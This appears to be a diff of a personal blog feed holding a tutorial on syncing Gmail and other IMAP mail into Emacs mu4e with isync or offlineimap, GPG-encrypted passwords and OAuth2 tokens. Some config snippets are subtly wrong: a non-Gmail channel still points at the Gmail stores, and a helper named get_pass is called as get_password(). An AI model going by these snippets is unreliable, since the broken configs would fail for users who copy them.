+&lt;p&gt;To Install &lt;em&gt;Isync&lt;/em&gt; or &lt;em&gt;Offlineimap&lt;/em&gt; On &lt;strong&gt;Debian&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;isync
+apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;offlineimap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;configuring-isync&quot;&gt;Configuring Isync&lt;/h2&gt;
+&lt;p&gt;Configuring &lt;em&gt;Isync&lt;/em&gt; is really easy however it depends on which options you’d like to set.
+By default if you gonna use &lt;em&gt;Gmail&lt;/em&gt; like myself. you’d wanna set some google options first .
+If you have 2FA enabled, you should first set up an app password this will let’s you control your &lt;em&gt;Gmail only&lt;/em&gt; will a custom generated password. First head up to &lt;a href=&quot;https://myaccount.google.com/apppasswords&quot;&gt;Set Up App Password&lt;/a&gt;, Select app as &lt;strong&gt;Mail&lt;/strong&gt; and device as &lt;strong&gt;Custom&lt;/strong&gt; and give it a name, it will generate a custom password. 
+&lt;strong&gt;Disclaimer&lt;/strong&gt; Your password should no be shared with anyone except yourself and &lt;em&gt;Isync&lt;/em&gt;
+&lt;strong&gt;Extra&lt;/strong&gt; As your password will be kept in &lt;em&gt;Isync&lt;/em&gt; config file in plain text, you can avoid this and encrypt it using &lt;strong&gt;GPG&lt;/strong&gt;. You can either use &lt;strong&gt;Pass&lt;/strong&gt; utility if its installed on your device as a wrapper around &lt;strong&gt;GPG&lt;/strong&gt; or use straight &lt;strong&gt;GPG&lt;/strong&gt;.
+To Crypt your password using &lt;strong&gt;pass&lt;/strong&gt; command.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pass insert gmail_app 
+Enter password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test_gmail: &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;
+Retype password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test_gmail: &lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;To Crypt your password using &lt;strong&gt;GPG&lt;/strong&gt; command, First generate a new key if you don’t have one yet .&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# This will prompt you for email and a name and a password (Use a valid real mail if you gonna share ur key will others)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# WARNING: DO NOT LOSE YOUR KEYS AND THE PASSWORD YOU USED TO CREATE THE KEYS OTHERWISE YOUR DATA WILL BE LOSE IF YOU LOSE THEM &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ALWAYS BACKUP YOUR .gnupg AND .password-store FOLDER TO A USB_DRIVE OR AN EXTERNAL DRIVE OR IN THE CLOUD&lt;/span&gt;
+gpg &lt;span class=&quot;nt&quot;&gt;--full-generate-key&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# After u create your own key, find it through the following command&lt;/span&gt;
+gpg &lt;span class=&quot;nt&quot;&gt;-K&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--keyid-format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;long
+&lt;span class=&quot;c&quot;&gt;# You&apos;ll get something like this &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# sec   rsa2048/84263A08F86B7E99 2020-06-17 [SC] [expires: 2022-06-17]&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       447FE384AAE41F357F5876FF84263A08F86B7E99&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# uid                 [ultimate] Ybenel &amp;lt;r2dr0dn@pm.me&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ssb   rsa2048/C8D9741AC03BE89C 2020-06-17 [E] [expires: 2022-06-17]&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Now you have your long key and ur short key, you can use whatever u want , now let&apos;s encrypt your file&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YOUR APP PASSWORD&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gmail_app
+gpg &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 84263A08F86B7E99 gmail_app 
+&lt;span class=&quot;c&quot;&gt;# This will create a new encrypted file called gmail_app.gpg, delete the gmail_app that contains plain text passowrd preferbly using shred&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Before quickly setting up our configuration file let’s create a mail folder, to do so .&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ~/Mail/Gmail
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we need to create our configuration file that is located in our HOME folder which will be called &lt;strong&gt;~/.mbsyncrc&lt;/strong&gt; . And Let’s put our configurations .&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IMAPAccount gmail
+Host imap.gmail.com
+User USERMAIL@gmail.com
+PassCmd &lt;span class=&quot;s2&quot;&gt;&quot;gpg -q --for-your-eyes-only --no-tty -d ~/.password-store/gmail_app.gpg&quot;&lt;/span&gt;
+SSLType IMAPS
+CertificateFile /etc/ssl/certs/ca-certificates.crt
+
+IMAPStore gmail-remote
+Account gmail
+
+MaildirStore gmail-local
+Subfolders Verbatim
+Path ~/Mail/Gmail/
+Inbox ~/Mail/Gmail/Inbox
+
+Channel gmail
+Far :gmail-remote:
+Near :gmail-local:
+Patterns &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;![&lt;/span&gt;Gmail]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Gmail]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Gmail]/All Mail&quot;&lt;/span&gt;
+Create Both
+Expunge Both
+SyncState &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If you use a plain text password replace &lt;strong&gt;PassCmd&lt;/strong&gt; With &lt;strong&gt;Pass&lt;/strong&gt; And Put your password .
+In &lt;strong&gt;Patterns&lt;/strong&gt; This will download &lt;em&gt;Sent Mail&lt;/em&gt; And &lt;em&gt;All Mail&lt;/em&gt; and exclude everything else, you can add other folders as well as example , &lt;strong&gt;“[Gmail]/Spam”&lt;/strong&gt; this will download the spam mail as well .
+&lt;strong&gt;Other Than GMAIL&lt;/strong&gt; if you use another email service you can replace the above config with the correct info , and replace gmail with a custom name, as a quick example .&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IMAPAccount cock 
+Host mail.cock.li
+User suckmycock11@cock.li
+PassCmd &lt;span class=&quot;s2&quot;&gt;&quot;gpg -q --for-your-eyes-only --no-tty -d ~/.password-store/cockli.gpg&quot;&lt;/span&gt;
+SSLType IMAPS
+CertificateFile /etc/ssl/certs/ca-certificates.crt
+
+IMAPStore cock-remote
+Account cock
+
+MaildirStore cock-local
+Subfolders Verbatim
+Path ~/Mail/cock/
+Inbox ~/Mail/cock/Inbox
+
+Channel gmail
+Far :gmail-remote:
+Near :gmail-local:
+Patterns &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;![&lt;/span&gt;Inbox]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Inbox]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[Inbox]/All Mail&quot;&lt;/span&gt;
+Create Both
+Expunge Both
+SyncState &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;configuring-offlineimap&quot;&gt;Configuring OfflineImap&lt;/h2&gt;
-&lt;p&gt;In order to configure offlineimap to receive our gmail mail we need to have few essential requirements .&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Offlineimap&lt;/em&gt; Configurations is no different than &lt;em&gt;Isync&lt;/em&gt; however it does support OAUTH2 authentication mechanism which u can use or not use if u want to and what it does is just the same as App Password But With Token. Keep in mind OAUTH2 does really need more little effort if you wanna use it. Starting Off With&lt;/p&gt;
 &lt;h3 id=&quot;setting-up-googleapi&quot;&gt;Setting Up GoogleApi&lt;/h3&gt;
 &lt;p&gt;GoogleAPI Is required to enable GmailApi , This will allow us to read and edit mail from our gmail account, to enable simply head over google api and search for gmailapi and click enable once its enabled search for generate token and copy it to an empty file for later.&lt;/p&gt;
 &lt;h3 id=&quot;installing-gmail-oauth-tools&quot;&gt;Installing gmail-oauth-tools&lt;/h3&gt;
 &lt;p&gt;In order for us to use the token we got earlier we need to install and use gmail-oauth-tools this will generate a refresh token that we will use later in configuring offlineimap.
-To Install simply clone the repo .&lt;/p&gt;
+To Install simply run .&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/google/gmail-oauth2-tools Public/oauth2-tools
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;And run the following command to get your refresh token&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 Public/oauth2-tools/python/oauth2.py &lt;span class=&quot;nt&quot;&gt;--generate_oauth2_token&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--client_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;YOUR_CLIENT_ID &lt;span class=&quot;nt&quot;&gt;--client_secret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;YOUR_CLIENT_SECRET
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;To Get Your CLIENT-ID Head over to &lt;a href=&quot;https://github.com/OfflineIMAP/offlineimap/blob/master/offlineimap.conf#L886-L894&quot;&gt;&lt;/a&gt; and read the steps .&lt;/p&gt;
+&lt;p&gt;To Get Your CLIENT-ID Head over to &lt;a href=&quot;https://github.com/OfflineIMAP/offlineimap/blob/master/offlineimap.conf#L886-L894&quot;&gt;Here&lt;/a&gt; and read the steps .&lt;/p&gt;
 
 &lt;h3 id=&quot;adding-the-configuration-files&quot;&gt;Adding The Configuration Files&lt;/h3&gt;
-&lt;p&gt;To Configure OfflineIMAP Put The Following Configurations In &lt;strong&gt;$HOME/..offlineimaprc&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;general]
-accounts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Gmail
-maxsyncaccounts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3
-&lt;span class=&quot;c&quot;&gt;#pythonfile = ~/.offlineimap.py&lt;/span&gt;
+&lt;p&gt;To Configure OfflineIMAP Put The Following Configurations In &lt;strong&gt;~/.offlineimaprc&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;[general]&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;accounts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Gmail&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;maxsyncaccounts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;3&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#pythonfile = ~/.offlineimap.py
+&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;[Account Gmail]&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;localrepository&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Local&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;remoterepository&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Remote&lt;/span&gt;
 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Account Gmail]
-localrepository &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Local
-remoterepository &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Remote
+&lt;span class=&quot;nn&quot;&gt;[Repository Local]&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Maildir&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;localfolders&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;~/Maildir&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: &apos;[Gmail]/&apos; + f if f in [&apos;Drafts&apos;, &apos;Starred&apos;, &apos;Important&apos;, &apos;Spam&apos;, &apos;Trash&apos;, &apos;All Mail&apos;, &apos;Sent Mail&apos;] else f&lt;/span&gt;
 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Repository Local]
-&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Maildir
-localfolders &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/Maildir
-nametrans &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; lambda f: &lt;span class=&quot;s1&quot;&gt;&apos;[Gmail]/&apos;&lt;/span&gt; + f &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;f &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Drafts&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Starred&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Important&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Spam&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Trash&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;All Mail&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Sent Mail&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else &lt;/span&gt;f
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Repository Remote]
-&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; IMAP
-remotehost &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; imap.gmail.com
-remoteuser &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; USERMAIL@gmail.com
-auth_mechanisms &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; XOAUTH2
-oauth2_client_id &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; CLIENT_ID
-oauth2_client_secret &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; CLIENT_SECRET
-oauth2_request_url &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; https://accounts.google.com/o/oauth2/token
-oauth2_refresh_token &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; REFRESH_TOKEN
-ssl &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;yes
-&lt;/span&gt;maxconnections &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
-sslcacertfile &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /etc/ssl/certs/ca-certificates.crt
-ssl_version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; tls1_2
-folderfilter &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; lambda foldername: foldername &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;INBOX&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Important&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-nametrans &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; lambda f: f.replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;[Gmail]/&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;f.startswith&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;[Gmail]/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else &lt;/span&gt;f
+&lt;span class=&quot;nn&quot;&gt;[Repository Remote]&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;IMAP&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;remotehost&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;imap.gmail.com&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;remoteuser&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;USERMAIL@gmail.com&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;auth_mechanisms&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;XOAUTH2&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;oauth2_client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;CLIENT_ID&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;oauth2_client_secret&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;CLIENT_SECRET&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;oauth2_request_url&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://accounts.google.com/o/oauth2/token&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;oauth2_refresh_token&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;REFRESH_TOKEN&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;ssl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;yes&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;maxconnections&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;sslcacertfile&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/etc/ssl/certs/ca-certificates.crt&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;ssl_version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;tls1_2&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;folderfilter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda foldername: foldername in [&apos;INBOX&apos;, &apos;All Mail&apos;, &apos;Sent Mail&apos;]&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: f.replace(&apos;[Gmail]/&apos;, &apos;&apos;) if f.startswith(&apos;[Gmail]/&apos;) else f&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;replace CLIENT-ID,CLIENT-SECRET,REFRESH-TOKEN with the tokens you’ve got.&lt;/p&gt;
+&lt;p&gt;Replace &lt;strong&gt;CLIENT-ID,CLIENT-SECRET,REFRESH-TOKEN&lt;/strong&gt; with the tokens you’ve got.
+In Case Of Using &lt;strong&gt;GPG ENCRYPTED PASSWORD&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#! /usr/bin/env python2
+# In side of offlineimap.py
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;
 
-&lt;h3 id=&quot;getting-mail&quot;&gt;Getting Mail&lt;/h3&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gpg -dq ~/.password-store/gmail.gpg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Incomment pythonfile in [general]&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Remove oauth2* settings in [Repository Remote] and add&lt;/span&gt;
+remotepasseval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; get_password&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In Case of Using &lt;strong&gt;Plain Text Password&lt;/strong&gt; Or &lt;strong&gt;Plain Password File&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove oauth2* settings in [Repository Remote] &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Add for plain text passowrd&lt;/span&gt;
+remotepass &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mypassword
+&lt;span class=&quot;c&quot;&gt;# Or Password file&lt;/span&gt;
+remotepassfile &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/gmail_app
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;getting-mail&quot;&gt;Getting Mail&lt;/h2&gt;
 &lt;p&gt;Now Once You’ve done all the previous steps , there’s one last step to do and that is to get mail to your inbox, simply run the following command to start getting ur mail.&lt;/p&gt;
+&lt;h3 id=&quot;offlineimap&quot;&gt;Offlineimap&lt;/h3&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offlineimap
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;getting-mu&quot;&gt;Getting Mu&lt;/h2&gt;
-&lt;p&gt;After getting your inbox and almost ready there’s only one last thing and that is to Initiat Mu, to execute mu simply run .&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mu init &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mu index
+&lt;h3 id=&quot;mu&quot;&gt;Mu&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mu init &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; ~/Mail &lt;span class=&quot;nt&quot;&gt;--my-address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;USERMAIL@gmail.com 
+mu index
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;And you’re finally done , all you gotta do now is to open up emacs and head over to mu4e and you’ll see all your mail there, make sure to hit update from time to time to update your inbox. And That’s pretty much it Thanks for reading :)&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="Emacs" /><category term="emacs" /><category term="mail" /><category term="offlineimap" /><category term="mu" /><category term="mu4e" /><summary type="html">If you’re an emacs user and love using emacs for literally everything , then you are in the right place. In This Short Tutorial we are gonna learn how to setup Mu4e In Emacs From Scratch.</summary></entry><entry><title type="html">Special Lyrics</title><link href="/rawan/2021/04/17/Girl.html" rel="alternate" type="text/html" title="Special Lyrics" /><published>2021-04-17T00:00:00+00:00</published><updated>2021-04-17T00:00:00+00:00</updated><id>/rawan/2021/04/17/Girl</id><content type="html" xml:base="/rawan/2021/04/17/Girl.html">&lt;h3 id=&quot;special-lyrics-to-someone-special-&quot;&gt;Special Lyrics To Someone special .&lt;/h3&gt;
+&lt;p&gt;And you’re finally done, you’ll now down all ur mail and it will be indexed automatically .&lt;/p&gt;
+&lt;h2 id=&quot;setting-up-mu4e-in-emacs&quot;&gt;Setting Up mu4e in emacs&lt;/h2&gt;
+&lt;p&gt;There isn’t much to do with  &lt;strong&gt;mu4e&lt;/strong&gt; in &lt;strong&gt;emacs&lt;/strong&gt; besides adding our configurations.
+My configurations is the following .&lt;/p&gt;
+&lt;div class=&quot;language-lisp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;add-to-list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;load-path&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/emacs/site-lisp/mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
